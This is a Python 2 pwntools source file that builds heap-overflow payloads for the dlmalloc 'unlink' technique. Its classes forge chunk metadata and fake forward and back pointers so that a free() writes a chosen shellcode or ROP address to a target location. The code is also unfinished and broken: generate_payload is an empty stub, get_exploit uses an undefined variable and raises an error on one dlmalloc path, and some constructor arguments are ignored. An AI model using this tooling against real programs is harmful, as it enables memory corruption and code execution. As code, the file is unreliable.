
from pwn import *

class HeaplibException(Exception):
    pass

class CraftedMetadata(object):
    """
    Represents the 2 DWORDS that overwrite the metadata of a chunk
    that is about to be freed.
    """
    def __init__(self, offset_to_prev_block=0xfffffff8, offset_to_next_block=0xfffffff0, CAC_prevsize=0xfffffff0, CAC_size=0xfffffff8):
        self.PREV_SIZE = offset_to_prev_block
        self.SIZE = offset_to_next_block

    def __str__(self):
        return pack(self.PREV_SIZE) + pack(self.SIZE)

class CraftedBlock(object):
    """
    Represents a crafted chunk that is positioned to be previous
    to the chunk that has been overflowed into and is subsequently
    freed.
    """
    def __init__(self, source, destination, fake_prevsize=0xfffffff1, fake_size=0xfffffff1):
        self.source = source
        self.destination = destination
        self.fake_prevsize = fake_prevsize
        self.fake_size = fake_size

    def __str__(self):
        return pack(self.fake_prevsize) + pack(self.fake_size) + pack(self.source) + pack(self.destination)

class HeapFrame(object):
    def __init__(self, source, destination, **kwargs):
        """
        source:       Address to which `destination` must be written out to.
        destination:  Address of your shellcode/ROP chain. Note that *(destination+8)
                      must be writable
        """
        self.source = source
        self.destination = destination
        self.allocator = kwargs.get("allocator", "dlmalloc")
        self.bytes_to_nextheader = kwargs.get("bytes_to_nextheader", None)
        self.required_content = kwargs.get("required_content", {})
        self.populating_character = kwargs.get("populating_character", "A")

    def populate_content(self):
        full_content = list(self.populating_character * self.bytes_to_nextheader)
        for offset in self.required_content:
            if offset < 0 or offset >= self.bytes_to_nextheader:
                raise HeaplibException("Invalid offset when populating content")
            content = self.required_content[offset]
            start, end = offset, offset+len(content)
            try:
                assert full_content[start:end] == ["A"] * len(content)
                full_content[start:end] = content
            except AssertionError, e:
                print start, end
                print full_content[start:end]
                print ["A"] * len(content)
                raise e
        return full_content

    def generate_payload(self, content):
        # We try to find positions for PREV_SIZE, SIZE of the block we
        # overwrite, PREV_SIZE, SIZE, FD, BD of the crafted block and
        # PREV_SIZE and SIZE for the block "after" "c"(the block whose
        # metadata is overwritten). We attempt to take advantage of
        # backward consolidation.

        PREV_SIZE_TO_OVERWRITE = 0

        # We start off with trying to find values for SIZE, so that
        # control moves to our `next` chunk when dlmalloc attempts to
        # do forward consolidation.
        SIZE_TO_OVERWRITE = 0

        pass


    def get_exploit(self):
        """
        The exploit returned will be in 2 parts.
        - The first part will contain data upto the part that
        is intended to overwrite the header of the next chunk.
        - The second part is supposed to be the data part of the
        chunk who is about to be freed.

        Uses the 'unlink' method to craft 2 values :
        1. CraftedMetadata
            This should overwrite the metadata of the block
            being freed.
        2. CraftedBlock
            This should be places in memory right after the
            crafted memory i.e. as the data of the block
            being freed.
        """
        if self.allocator == "dlmalloc":
            if not bytes_to_nextheader:
                return str(CraftedMetadata()), str(CraftedBlock(self.source-12, self.destination))
            else:
                content = self.populate_content()
                payload = self.generate_payload(content)

        raise HeaplibException("Allocator not supported")

    def __str__(self):
        return ''.join(self.get_exploit())
